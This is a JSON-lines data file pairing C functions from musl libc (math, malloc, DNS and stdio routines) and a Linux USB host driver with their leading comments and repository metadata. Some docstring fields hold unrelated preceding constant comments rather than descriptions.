{"docstring": "/* asinh(x) = sign(x)*log(|x|+sqrt(x*x+1)) ~= x - x^3/6 + o(x^5) */\n", "func_signal": "long double asinhl(long double x)", "code": "{\n\tunion ldshape u = {x};\n\tunsigned e = u.i.se & 0x7fff;\n\tunsigned s = u.i.se >> 15;\n\n\t/* |x| */\n\tu.i.se = e;\n\tx = u.f;\n\n\tif (e >= 0x3fff + 32) {\n\t\t/* |x| >= 0x1p32 or inf or nan */\n\t\tx = logl(x) + 0.693147180559945309417232121458176568L;\n\t} else if (e >= 0x3fff + 1) {\n\t\t/* |x| >= 2 */\n\t\tx = logl(2*x + 1/(sqrtl(x*x+1)+x));\n\t} else if (e >= 0x3fff - 32) {\n\t\t/* |x| >= 0x1p-32 */\n\t\tx = log1pl(x + x*x/(sqrtl(x*x+1)+1));\n\t} else {\n\t\t/* |x| < 0x1p-32, raise inexact if x!=0 */\n\t\tFORCE_EVAL(x + 0x1p120f);\n\t}\n\treturn s ? -x : x;\n}", "path": "src\\math\\asinhl.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* This assumes that a check for the\n   template size has already been made */\n", "func_signal": "char *__randname(char *template)", "code": "{\n\tint i;\n\tstruct timespec ts;\n\tunsigned long r;\n\n\t__clock_gettime(CLOCK_REALTIME, &ts);\n\tr = ts.tv_nsec*65537 ^ (uintptr_t)&ts / 16 + (uintptr_t)template;\n\tfor (i=0; i<6; i++, r>>=5)\n\t\ttemplate[i] = 'A'+(r&15)+(r&16)*2;\n\n\treturn template;\n}", "path": "src\\temp\\__randname.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* label lengths of an ascii domain name s */\n", "func_signal": "static int getlens(unsigned char *lens, const char *s, int l)", "code": "{\n\tint i=0,j=0,k=0;\n\tfor (;;) {\n\t\tfor (; j<l && s[j]!='.'; j++);\n\t\tif (j-k-1u > 62) return 0;\n\t\tlens[i++] = j-k;\n\t\tif (j==l) return i;\n\t\tk = ++j;\n\t}\n}", "path": "src\\network\\dn_comp.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* label start offsets of a compressed domain name s */\n", "func_signal": "static int getoffs(short *offs, const unsigned char *base, const unsigned char *s)", "code": "{\n\tint i=0;\n\tfor (;;) {\n\t\twhile (*s & 0xc0) {\n\t\t\tif ((*s & 0xc0) != 0xc0) return 0;\n\t\t\ts = base + ((s[0]&0x3f)<<8 | s[1]);\n\t\t}\n\t\tif (!*s) return i;\n\t\tif (s-base >= 0x4000) return 0;\n\t\toffs[i++] = s-base;\n\t\ts += *s + 1;\n\t}\n}", "path": "src\\network\\dn_comp.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* expf(x)/2 for x >= log(FLT_MAX), slightly better than 0.5f*expf(x/2)*expf(x/2) */\n", "func_signal": "float __expo2f(float x)", "code": "{\n\tfloat scale;\n\n\t/* note that k is odd and scale*scale overflows */\n\tSET_FLOAT_WORD(scale, (uint32_t)(0x7f + k/2) << 23);\n\t/* exp(x - k ln2) * 2**(k-1) */\n\treturn expf(x - kln2) * scale * scale;\n}", "path": "src\\math\\__expo2f.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* longest suffix match of an ascii domain with a compressed domain name dn */\n", "func_signal": "static int match(int *offset, const unsigned char *base, const unsigned char *dn,\n\tconst char *end, const unsigned char *lens, int nlen)", "code": "{\n\tint l, o, m=0;\n\tshort offs[128];\n\tint noff = getoffs(offs, base, dn);\n\tif (!noff) return 0;\n\tfor (;;) {\n\t\tl = lens[--nlen];\n\t\to = offs[--noff];\n\t\tend -= l;\n\t\tif (l != base[o] || memcmp(base+o+1, end, l))\n\t\t\treturn m;\n\t\t*offset = o;\n\t\tm += l;\n\t\tif (nlen) m++;\n\t\tif (!nlen || !noff) return m;\n\t\tend--;\n\t}\n}", "path": "src\\network\\dn_comp.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* pretrim - trims a chunk _prior_ to removing it from its bin.\n * Must be called with i as the ideal bin for size n, j the bin\n * for the _free_ chunk self, and bin j locked. */\n", "func_signal": "static int pretrim(struct chunk *self, size_t n, int i, int j)", "code": "{\n\tsize_t n1;\n\tstruct chunk *next, *split;\n\n\t/* We cannot pretrim if it would require re-binning. */\n\tif (j < 40) return 0;\n\tif (j < i+3) {\n\t\tif (j != 63) return 0;\n\t\tn1 = CHUNK_SIZE(self);\n\t\tif (n1-n <= MMAP_THRESHOLD) return 0;\n\t} else {\n\t\tn1 = CHUNK_SIZE(self);\n\t}\n\tif (bin_index(n1-n) != j) return 0;\n\n\tnext = NEXT_CHUNK(self);\n\tsplit = (void *)((char *)self + n);\n\n\tsplit->prev = self->prev;\n\tsplit->next = self->next;\n\tsplit->prev->next = split;\n\tsplit->next->prev = split;\n\tsplit->psize = n | C_INUSE;\n\tsplit->csize = n1-n;\n\tnext->psize = n1-n;\n\tself->csize = n | C_INUSE;\n\treturn 1;\n}", "path": "src\\malloc\\malloc.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* asinh(z) = -i asin(i z) */\n", "func_signal": "double complex casinh(double complex z)", "code": "{\n\tz = casin(CMPLX(-cimag(z), creal(z)));\n\treturn CMPLX(cimag(z), -creal(z));\n}", "path": "src\\complex\\casinh.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* Synchronization tools */\n", "func_signal": "static inline void lock(volatile int *lk)", "code": "{\n\tif (libc.threads_minus_1)\n\t\twhile(a_swap(lk, 1)) __wait(lk, lk+1, 1, 1);\n}", "path": "src\\malloc\\malloc.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* acosh(x) = log(x + sqrt(x*x-1)) */\n", "func_signal": "double acosh(double x)", "code": "{\n\tunion {double f; uint64_t i;} u = {.f = x};\n\tunsigned e = u.i >> 52 & 0x7ff;\n\n\t/* x < 1 domain error is handled in the called functions */\n\n\tif (e < 0x3ff + 1)\n\t\t/* |x| < 2, up to 2ulp error in [1,1.125] */\n\t\treturn log1p(x-1 + sqrt((x-1)*(x-1)+2*(x-1)));\n\tif (e < 0x3ff + 26)\n\t\t/* |x| < 0x1p26 */\n\t\treturn log(2*x - 1/(x+sqrt(x*x-1)));\n\t/* |x| >= 0x1p26 or nan */\n\treturn log(x) + 0.693147180559945309417232121458176568;\n}", "path": "src\\math\\acosh.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* 0xC03670E2, 0x42712D62 */\n", "func_signal": "static double erfc1(double x)", "code": "{\n\tdouble_t s,P,Q;\n\n\ts = fabs(x) - 1;\n\tP = pa0+s*(pa1+s*(pa2+s*(pa3+s*(pa4+s*(pa5+s*pa6)))));\n\tQ = 1+s*(qa1+s*(qa2+s*(qa3+s*(qa4+s*(qa5+s*qa6)))));\n\treturn 1 - erx - P/Q;\n}", "path": "src\\math\\erf.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* atanh(x) = log((1+x)/(1-x))/2 = log1p(2x/(1-x))/2 ~= x + x^3/3 + o(x^5) */\n", "func_signal": "double atanh(double x)", "code": "{\n\tunion {double f; uint64_t i;} u = {.f = x};\n\tunsigned e = u.i >> 52 & 0x7ff;\n\tunsigned s = u.i >> 63;\n\tdouble_t y;\n\n\t/* |x| */\n\tu.i &= (uint64_t)-1/2;\n\ty = u.f;\n\n\tif (e < 0x3ff - 1) {\n\t\tif (e < 0x3ff - 32) {\n\t\t\t/* handle underflow */\n\t\t\tif (e == 0)\n\t\t\t\tFORCE_EVAL((float)y);\n\t\t} else {\n\t\t\t/* |x| < 0.5, up to 1.7ulp error */\n\t\t\ty = 0.5*log1p(2*y + 2*y*y/(1-y));\n\t\t}\n\t} else {\n\t\t/* avoid overflow */\n\t\ty = 0.5*log1p(2*(y/(1-y)));\n\t}\n\treturn s ? -y : y;\n}", "path": "src\\math\\atanh.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* sinh(x) = (exp(x) - 1/exp(x))/2\n *         = (exp(x)-1 + (exp(x)-1)/exp(x))/2\n *         = x + x^3/6 + o(x^5)\n */\n", "func_signal": "double sinh(double x)", "code": "{\n\tunion {double f; uint64_t i;} u = {.f = x};\n\tuint32_t w;\n\tdouble t, h, absx;\n\n\th = 0.5;\n\tif (u.i >> 63)\n\t\th = -h;\n\t/* |x| */\n\tu.i &= (uint64_t)-1/2;\n\tabsx = u.f;\n\tw = u.i >> 32;\n\n\t/* |x| < log(DBL_MAX) */\n\tif (w < 0x40862e42) {\n\t\tt = expm1(absx);\n\t\tif (w < 0x3ff00000) {\n\t\t\tif (w < 0x3ff00000 - (26<<20))\n\t\t\t\t/* note: inexact and underflow are raised by expm1 */\n\t\t\t\t/* note: this branch avoids spurious underflow */\n\t\t\t\treturn x;\n\t\t\treturn h*(2*t - t*t/(t+1));\n\t\t}\n\t\t/* note: |x|>log(0x1p26)+eps could be just h*exp(x) */\n\t\treturn h*(t + t/(t+1));\n\t}\n\n\t/* |x| > log(DBL_MAX) or nan */\n\t/* note: the result is stored to handle overflow */\n\tt = 2*h*__expo2(absx);\n\treturn t;\n}", "path": "src\\math\\sinh.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* There is no other implemented value than TIME_UTC; all other values\n * are considered erroneous. */\n", "func_signal": "int timespec_get(struct timespec * ts, int base)", "code": "{\n\tif (base != TIME_UTC) return 0;\n\tint ret = __clock_gettime(CLOCK_REALTIME, ts);\n\treturn ret < 0 ? 0 : base;\n}", "path": "src\\time\\timespec_get.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* 0.24279078841 */\n", "func_signal": "float log2f(float x)", "code": "{\n\tunion {float f; uint32_t i;} u = {x};\n\tfloat_t hfsq,f,s,z,R,w,t1,t2,hi,lo;\n\tuint32_t ix;\n\tint k;\n\n\tix = u.i;\n\tk = 0;\n\tif (ix < 0x00800000 || ix>>31) {  /* x < 2**-126  */\n\t\tif (ix<<1 == 0)\n\t\t\treturn -1/(x*x);  /* log(+-0)=-inf */\n\t\tif (ix>>31)\n\t\t\treturn (x-x)/0.0f; /* log(-#) = NaN */\n\t\t/* subnormal number, scale up x */\n\t\tk -= 25;\n\t\tx *= 0x1p25f;\n\t\tu.f = x;\n\t\tix = u.i;\n\t} else if (ix >= 0x7f800000) {\n\t\treturn x;\n\t} else if (ix == 0x3f800000)\n\t\treturn 0;\n\n\t/* reduce x into [sqrt(2)/2, sqrt(2)] */\n\tix += 0x3f800000 - 0x3f3504f3;\n\tk += (int)(ix>>23) - 0x7f;\n\tix = (ix&0x007fffff) + 0x3f3504f3;\n\tu.i = ix;\n\tx = u.f;\n\n\tf = x - 1.0f;\n\ts = f/(2.0f + f);\n\tz = s*s;\n\tw = z*z;\n\tt1= w*(Lg2+w*Lg4);\n\tt2= z*(Lg1+w*Lg3);\n\tR = t2 + t1;\n\thfsq = 0.5f*f*f;\n\n\thi = f - hfsq;\n\tu.f = hi;\n\tu.i &= 0xfffff000;\n\thi = u.f;\n\tlo = f - hi - hfsq + s*(hfsq+R);\n\treturn (lo+hi)*ivln2lo + lo*ivln2hi + hi*ivln2hi + k;\n}", "path": "src\\math\\log2f.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* This function makes no attempt to protect the user from his/her own\n * stupidity. If called any time but when then ISO C standard specifically\n * allows it, all hell can and will break loose, especially with threads!\n *\n * This implementation ignores all arguments except the buffering type,\n * and uses the existing buffer allocated alongside the FILE object.\n * In the case of stderr where the preexisting buffer is length 1, it\n * is not possible to set line buffering or full buffering. */\n", "func_signal": "int setvbuf(FILE *restrict f, char *restrict buf, int type, size_t size)", "code": "{\n\tf->lbf = EOF;\n\n\tif (type == _IONBF)\n\t\tf->buf_size = 0;\n\telse if (type == _IOLBF)\n\t\tf->lbf = '\\n';\n\n\tf->flags |= F_SVB;\n\n\treturn 0;\n}", "path": "src\\stdio\\setvbuf.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* This function will never be called if there is already data\n * buffered for reading. Thus we can get by with very few branches. */\n", "func_signal": "int __uflow(FILE *f)", "code": "{\n\tunsigned char c;\n\tif ((f->rend || !__toread(f)) && f->read(f, &c, 1)==1) return c;\n\treturn EOF;\n}", "path": "src\\stdio\\__uflow.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* B2 = (127-127.0/3-24/3-0.03306235651)*2**23 */\n", "func_signal": "float cbrtf(float x)", "code": "{\n\tdouble_t r,T;\n\tunion {float f; uint32_t i;} u = {x};\n\tuint32_t hx = u.i & 0x7fffffff;\n\n\tif (hx >= 0x7f800000)  /* cbrt(NaN,INF) is itself */\n\t\treturn x + x;\n\n\t/* rough cbrt to 5 bits */\n\tif (hx < 0x00800000) {  /* zero or subnormal? */\n\t\tif (hx == 0)\n\t\t\treturn x;  /* cbrt(+-0) is itself */\n\t\tu.f = x*0x1p24f;\n\t\thx = u.i & 0x7fffffff;\n\t\thx = hx/3 + B2;\n\t} else\n\t\thx = hx/3 + B1;\n\tu.i &= 0x80000000;\n\tu.i |= hx;\n\n\t/*\n\t * First step Newton iteration (solving t*t-x/t == 0) to 16 bits.  In\n\t * double precision so that its terms can be arranged for efficiency\n\t * without causing overflow or underflow.\n\t */\n\tT = u.f;\n\tr = T*T*T;\n\tT = T*((double_t)x+x+r)/(x+r+r);\n\n\t/*\n\t * Second step Newton iteration to 47 bits.  In double precision for\n\t * efficiency and accuracy.\n\t */\n\tr = T*T*T;\n\tT = T*((double_t)x+x+r)/(x+r+r);\n\n\t/* rounding to 24 bits is perfect in round-to-nearest mode */\n\treturn T;\n}", "path": "src\\math\\cbrtf.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* A huge hack: to make up for the wastefulness of shared libraries\n * needing at least a page of dirty memory even if they have no global\n * data, we reclaim the gaps at the beginning and end of writable maps\n * and \"donate\" them to the heap by setting up minimal malloc\n * structures and then freeing them. */\n", "func_signal": "static void reclaim(struct dso *dso, size_t start, size_t end)", "code": "{\n\tsize_t *a, *z;\n\tif (start >= dso->relro_start && start < dso->relro_end) start = dso->relro_end;\n\tif (end   >= dso->relro_start && end   < dso->relro_end) end = dso->relro_start;\n\tstart = start + 6*sizeof(size_t)-1 & -4*sizeof(size_t);\n\tend = (end & -4*sizeof(size_t)) - 2*sizeof(size_t);\n\tif (start>end || end-start < 4*sizeof(size_t)) return;\n\ta = (size_t *)(dso->base + start);\n\tz = (size_t *)(dso->base + end);\n\ta[-2] = 1;\n\ta[-1] = z[0] = end-start + 2*sizeof(size_t) | 1;\n\tz[1] = 1;\n\tfree(a);\n}", "path": "src\\ldso\\dynlink.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* This read function heavily cheats. It knows:\n *  (1) len will always be 1\n *  (2) non-ascii characters don't matter */\n", "func_signal": "static size_t do_read(FILE *f, unsigned char *buf, size_t len)", "code": "{\n\tsize_t i;\n\tconst wchar_t *wcs = f->cookie;\n\n\tif (!wcs[0]) wcs=L\"@\";\n\tfor (i=0; i<f->buf_size && wcs[i]; i++)\n\t\tf->buf[i] = wcs[i] < 128 ? wcs[i] : '@';\n\tf->rpos = f->buf;\n\tf->rend = f->buf + i;\n\tf->cookie = (void *)(wcs+i);\n\n\tif (i && len) {\n\t\t*buf = *f->rpos++;\n\t\treturn 1;\n\t}\n\treturn 0;\n}", "path": "src\\stdlib\\wcstod.c", "repo_name": "esmil/musl", "stars": 53, "license": "other", "language": "c", "size": 4260}
{"docstring": "/* Remember to add cleanup code (above) if you add anything here.\n */\n", "func_signal": "static int ehci_mem_init(struct oxu_hcd *oxu, gfp_t flags)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < oxu->periodic_size; i++)\n\t\toxu->mem->frame_list[i] = EHCI_LIST_END;\n\tfor (i = 0; i < QHEAD_NUM; i++)\n\t\toxu->qh_used[i] = 0;\n\tfor (i = 0; i < QTD_NUM; i++)\n\t\toxu->qtd_used[i] = 0;\n\n\toxu->murb_pool = kcalloc(MURB_NUM, sizeof(struct oxu_murb), flags);\n\tif (!oxu->murb_pool)\n\t\tgoto fail;\n\n\tfor (i = 0; i < MURB_NUM; i++)\n\t\toxu->murb_used[i] = 0;\n\n\toxu->async = oxu_qh_alloc(oxu);\n\tif (!oxu->async)\n\t\tgoto fail;\n\n\toxu->periodic = (__le32 *) &oxu->mem->frame_list;\n\toxu->periodic_dma = virt_to_phys(oxu->periodic);\n\n\tfor (i = 0; i < oxu->periodic_size; i++)\n\t\toxu->periodic[i] = EHCI_LIST_END;\n\n\t/* software shadow of hardware table */\n\toxu->pshadow = kcalloc(oxu->periodic_size, sizeof(void *), flags);\n\tif (oxu->pshadow != NULL)\n\t\treturn 0;\n\nfail:\n\toxu_dbg(oxu, \"couldn't init memory\\n\");\n\tehci_mem_cleanup(oxu);\n\treturn -ENOMEM;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Put TDI/ARC silicon into EHCI mode */\n", "func_signal": "static void tdi_reset(struct oxu_hcd *oxu)", "code": "{\n\tu32 __iomem *reg_ptr;\n\tu32 tmp;\n\n\treg_ptr = (u32 __iomem *)(((u8 __iomem *)oxu->regs) + 0x68);\n\ttmp = readl(reg_ptr);\n\ttmp |= 0x3;\n\twritel(tmp, reg_ptr);\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Create a list of filled qtds for this URB; won't link into qh.\n */\n", "func_signal": "static struct list_head *qh_urb_transaction(struct oxu_hcd *oxu,\n\t\t\t\t\t\tstruct urb *urb,\n\t\t\t\t\t\tstruct list_head *head,\n\t\t\t\t\t\tgfp_t flags)", "code": "{\n\tstruct ehci_qtd\t*qtd, *qtd_prev;\n\tdma_addr_t buf;\n\tint len, maxpacket;\n\tint is_input;\n\tu32 token;\n\tvoid *transfer_buf = NULL;\n\tint ret;\n\n\t/*\n\t * URBs map to sequences of QTDs: one logical transaction\n\t */\n\tqtd = ehci_qtd_alloc(oxu);\n\tif (unlikely(!qtd))\n\t\treturn NULL;\n\tlist_add_tail(&qtd->qtd_list, head);\n\tqtd->urb = urb;\n\n\ttoken = QTD_STS_ACTIVE;\n\ttoken |= (EHCI_TUNE_CERR << 10);\n\t/* for split transactions, SplitXState initialized to zero */\n\n\tlen = urb->transfer_buffer_length;\n\tis_input = usb_pipein(urb->pipe);\n\tif (!urb->transfer_buffer && urb->transfer_buffer_length && is_input)\n\t\turb->transfer_buffer = phys_to_virt(urb->transfer_dma);\n\n\tif (usb_pipecontrol(urb->pipe)) {\n\t\t/* SETUP pid */\n\t\tret = oxu_buf_alloc(oxu, qtd, sizeof(struct usb_ctrlrequest));\n\t\tif (ret)\n\t\t\tgoto cleanup;\n\n\t\tqtd_fill(qtd, qtd->buffer_dma, sizeof(struct usb_ctrlrequest),\n\t\t\t\ttoken | (2 /* \"setup\" */ << 8), 8);\n\t\tmemcpy(qtd->buffer, qtd->urb->setup_packet,\n\t\t\t\tsizeof(struct usb_ctrlrequest));\n\n\t\t/* ... and always at least one more pid */\n\t\ttoken ^= QTD_TOGGLE;\n\t\tqtd_prev = qtd;\n\t\tqtd = ehci_qtd_alloc(oxu);\n\t\tif (unlikely(!qtd))\n\t\t\tgoto cleanup;\n\t\tqtd->urb = urb;\n\t\tqtd_prev->hw_next = QTD_NEXT(qtd->qtd_dma);\n\t\tlist_add_tail(&qtd->qtd_list, head);\n\n\t\t/* for zero length DATA stages, STATUS is always IN */\n\t\tif (len == 0)\n\t\t\ttoken |= (1 /* \"in\" */ << 8);\n\t}\n\n\t/*\n\t * Data transfer stage: buffer setup\n\t */\n\n\tret = oxu_buf_alloc(oxu, qtd, len);\n\tif (ret)\n\t\tgoto cleanup;\n\n\tbuf = qtd->buffer_dma;\n\ttransfer_buf = urb->transfer_buffer;\n\n\tif (!is_input)\n\t\tmemcpy(qtd->buffer, qtd->urb->transfer_buffer, len);\n\n\tif (is_input)\n\t\ttoken |= (1 /* \"in\" */ << 8);\n\t/* else it's already initted to \"out\" pid (0 << 8) */\n\n\tmaxpacket = max_packet(usb_maxpacket(urb->dev, urb->pipe, !is_input));\n\n\t/*\n\t * buffer gets wrapped in one or more qtds;\n\t * last one may be \"short\" (including zero len)\n\t * and may serve as a control status ack\n\t */\n\tfor (;;) {\n\t\tint this_qtd_len;\n\n\t\tthis_qtd_len = qtd_fill(qtd, buf, len, token, maxpacket);\n\t\tqtd->transfer_buffer = transfer_buf;\n\t\tlen -= this_qtd_len;\n\t\tbuf += this_qtd_len;\n\t\ttransfer_buf += this_qtd_len;\n\t\tif (is_input)\n\t\t\tqtd->hw_alt_next = oxu->async->hw_alt_next;\n\n\t\t/* qh makes control packets use qtd toggle; maybe switch it */\n\t\tif ((maxpacket & (this_qtd_len + (maxpacket - 1))) == 0)\n\t\t\ttoken ^= QTD_TOGGLE;\n\n\t\tif (likely(len <= 0))\n\t\t\tbreak;\n\n\t\tqtd_prev = qtd;\n\t\tqtd = ehci_qtd_alloc(oxu);\n\t\tif (unlikely(!qtd))\n\t\t\tgoto cleanup;\n\t\tif (likely(len > 0)) {\n\t\t\tret = oxu_buf_alloc(oxu, qtd, len);\n\t\t\tif (ret)\n\t\t\t\tgoto cleanup;\n\t\t}\n\t\tqtd->urb = urb;\n\t\tqtd_prev->hw_next = QTD_NEXT(qtd->qtd_dma);\n\t\tlist_add_tail(&qtd->qtd_list, head);\n\t}\n\n\t/* unless the bulk/interrupt caller wants a chance to clean\n\t * up after short reads, hc should advance qh past this urb\n\t */\n\tif (likely((urb->transfer_flags & URB_SHORT_NOT_OK) == 0\n\t\t\t\t|| usb_pipecontrol(urb->pipe)))\n\t\tqtd->hw_alt_next = EHCI_LIST_END;\n\n\t/*\n\t * control requests may need a terminating data \"status\" ack;\n\t * bulk ones may need a terminating short packet (zero length).\n\t */\n\tif (likely(urb->transfer_buffer_length != 0)) {\n\t\tint\tone_more = 0;\n\n\t\tif (usb_pipecontrol(urb->pipe)) {\n\t\t\tone_more = 1;\n\t\t\ttoken ^= 0x0100;\t/* \"in\" <--> \"out\"  */\n\t\t\ttoken |= QTD_TOGGLE;\t/* force DATA1 */\n\t\t} else if (usb_pipebulk(urb->pipe)\n\t\t\t\t&& (urb->transfer_flags & URB_ZERO_PACKET)\n\t\t\t\t&& !(urb->transfer_buffer_length % maxpacket)) {\n\t\t\tone_more = 1;\n\t\t}\n\t\tif (one_more) {\n\t\t\tqtd_prev = qtd;\n\t\t\tqtd = ehci_qtd_alloc(oxu);\n\t\t\tif (unlikely(!qtd))\n\t\t\t\tgoto cleanup;\n\t\t\tqtd->urb = urb;\n\t\t\tqtd_prev->hw_next = QTD_NEXT(qtd->qtd_dma);\n\t\t\tlist_add_tail(&qtd->qtd_list, head);\n\n\t\t\t/* never any data in such packets */\n\t\t\tqtd_fill(qtd, 0, 0, token, 0);\n\t\t}\n\t}\n\n\t/* by default, enable interrupt on urb completion */\n\t\tqtd->hw_token |= __constant_cpu_to_le32(QTD_IOC);\n\treturn head;\n\ncleanup:\n\tqtd_list_free(oxu, urb, head);\n\treturn NULL;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* This function is responsible for breaking URBs with big data size\n * into smaller size and processing small urbs in sequence.\n */\n", "func_signal": "static int oxu_urb_enqueue(struct usb_hcd *hcd, struct urb *urb,\n\t\t\t\tgfp_t mem_flags)", "code": "{\n\tstruct oxu_hcd *oxu = hcd_to_oxu(hcd);\n\tint num, rem;\n\tint transfer_buffer_length;\n\tvoid *transfer_buffer;\n\tstruct urb *murb;\n\tint i, ret;\n\n\t/* If not bulk pipe just enqueue the URB */\n\tif (!usb_pipebulk(urb->pipe))\n\t\treturn __oxu_urb_enqueue(hcd, urb, mem_flags);\n\n\t/* Otherwise we should verify the USB transfer buffer size! */\n\ttransfer_buffer = urb->transfer_buffer;\n\ttransfer_buffer_length = urb->transfer_buffer_length;\n\n\tnum = urb->transfer_buffer_length / 4096;\n\trem = urb->transfer_buffer_length % 4096;\n\tif (rem != 0)\n\t\tnum++;\n\n\t/* If URB is smaller than 4096 bytes just enqueue it! */\n\tif (num == 1)\n\t\treturn __oxu_urb_enqueue(hcd, urb, mem_flags);\n\n\t/* Ok, we have more job to do! :) */\n\n\tfor (i = 0; i < num - 1; i++) {\n\t\t/* Get free micro URB poll till a free urb is recieved */\n\n\t\tdo {\n\t\t\tmurb = (struct urb *) oxu_murb_alloc(oxu);\n\t\t\tif (!murb)\n\t\t\t\tschedule();\n\t\t} while (!murb);\n\n\t\t/* Coping the urb */\n\t\tmemcpy(murb, urb, sizeof(struct urb));\n\n\t\tmurb->transfer_buffer_length = 4096;\n\t\tmurb->transfer_buffer = transfer_buffer + i * 4096;\n\n\t\t/* Null pointer for the encodes that this is a micro urb */\n\t\tmurb->complete = NULL;\n\n\t\t((struct oxu_murb *) murb)->main = urb;\n\t\t((struct oxu_murb *) murb)->last = 0;\n\n\t\t/* This loop is to guarantee urb to be processed when there's\n\t\t * not enough resources at a particular time by retrying.\n\t\t */\n\t\tdo {\n\t\t\tret  = __oxu_urb_enqueue(hcd, murb, mem_flags);\n\t\t\tif (ret)\n\t\t\t\tschedule();\n\t\t} while (ret);\n\t}\n\n\t/* Last urb requires special handling  */\n\n\t/* Get free micro URB poll till a free urb is recieved */\n\tdo {\n\t\tmurb = (struct urb *) oxu_murb_alloc(oxu);\n\t\tif (!murb)\n\t\t\tschedule();\n\t} while (!murb);\n\n\t/* Coping the urb */\n\tmemcpy(murb, urb, sizeof(struct urb));\n\n\tmurb->transfer_buffer_length = rem > 0 ? rem : 4096;\n\tmurb->transfer_buffer = transfer_buffer + (num - 1) * 4096;\n\n\t/* Null pointer for the encodes that this is a micro urb */\n\tmurb->complete = NULL;\n\n\t((struct oxu_murb *) murb)->main = urb;\n\t((struct oxu_murb *) murb)->last = 1;\n\n\tdo {\n\t\tret = __oxu_urb_enqueue(hcd, murb, mem_flags);\n\t\tif (ret)\n\t\t\tschedule();\n\t} while (ret);\n\n\treturn ret;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Allocate an OXU210HP on-chip memory data buffer\n *\n * An on-chip memory data buffer is required for each OXU210HP USB transfer.\n * Each transfer descriptor has one or more on-chip memory data buffers.\n *\n * Data buffers are allocated from a fix sized pool of data blocks.\n * To minimise fragmentation and give reasonable memory utlisation,\n * data buffers are allocated with sizes the power of 2 multiples of\n * the block size, starting on an address a multiple of the allocated size.\n *\n * FIXME: callers of this function require a buffer to be allocated for\n * len=0. This is a waste of on-chip memory and should be fix. Then this\n * function should be changed to not allocate a buffer for len=0.\n */\n", "func_signal": "static int oxu_buf_alloc(struct oxu_hcd *oxu, struct ehci_qtd *qtd, int len)", "code": "{\n\tint n_blocks;\t/* minium blocks needed to hold len */\n\tint a_blocks;\t/* blocks allocated */\n\tint i, j;\n\n\t/* Don't allocte bigger than supported */\n\tif (len > BUFFER_SIZE * BUFFER_NUM) {\n\t\toxu_err(oxu, \"buffer too big (%d)\\n\", len);\n\t\treturn -ENOMEM;\n\t}\n\n\tspin_lock(&oxu->mem_lock);\n\n\t/* Number of blocks needed to hold len */\n\tn_blocks = (len + BUFFER_SIZE - 1) / BUFFER_SIZE;\n\n\t/* Round the number of blocks up to the power of 2 */\n\tfor (a_blocks = 1; a_blocks < n_blocks; a_blocks <<= 1)\n\t\t;\n\n\t/* Find a suitable available data buffer */\n\tfor (i = 0; i < BUFFER_NUM;\n\t\t\ti += max(a_blocks, (int)oxu->db_used[i])) {\n\n\t\t/* Check all the required blocks are available */\n\t\tfor (j = 0; j < a_blocks; j++)\n\t\t\tif (oxu->db_used[i + j])\n\t\t\t\tbreak;\n\n\t\tif (j != a_blocks)\n\t\t\tcontinue;\n\n\t\t/* Allocate blocks found! */\n\t\tqtd->buffer = (void *) &oxu->mem->db_pool[i];\n\t\tqtd->buffer_dma = virt_to_phys(qtd->buffer);\n\n\t\tqtd->qtd_buffer_len = BUFFER_SIZE * a_blocks;\n\t\toxu->db_used[i] = a_blocks;\n\n\t\tspin_unlock(&oxu->mem_lock);\n\n\t\treturn 0;\n\t}\n\n\t/* Failed */\n\n\tspin_unlock(&oxu->mem_lock);\n\n\treturn -ENOMEM;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
